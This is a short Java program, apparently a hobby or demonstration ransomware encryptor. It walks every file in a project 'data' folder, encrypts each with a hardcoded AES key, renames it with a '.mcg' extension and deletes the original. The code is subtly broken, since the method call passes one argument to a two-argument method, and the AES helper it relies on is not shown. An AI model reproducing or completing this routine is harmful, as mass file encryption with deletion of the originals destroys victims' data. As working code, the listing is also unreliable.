import java.io.File;

public class main {

    public static String CodeKey = "CodeKey";
    //Project Path
    public static String currentWorkingDir = System.getProperty("user.dir");
    public static String basedir = currentWorkingDir + "\\data\\";

    public static void main(String[] args) {

        FireUP(basedir);

    }

    public static void FireUP(String path){
        File file = new File(path);
        File[] files = file.listFiles();

        for(File f:files){
            System.out.println(f.getName());
            System.out.println();
            Encrypt(path + f.getName());
        }
    }


    public static void Encrypt(String targetFilePath, String CodeKey){

        File inputFile = new File(targetFilePath);
        File encryptedFile = new File(targetFilePath + ".mcg");

        try{
            AES256.encrypt(CodeKey, inputFile, encryptedFile);
            System.out.println(inputFile + "is encrypted now...");
            inputFile.delete();

        } catch (Exception e){
            System.out.println(e.getMessage());
            e.printStackTrace();
        }

    }





}
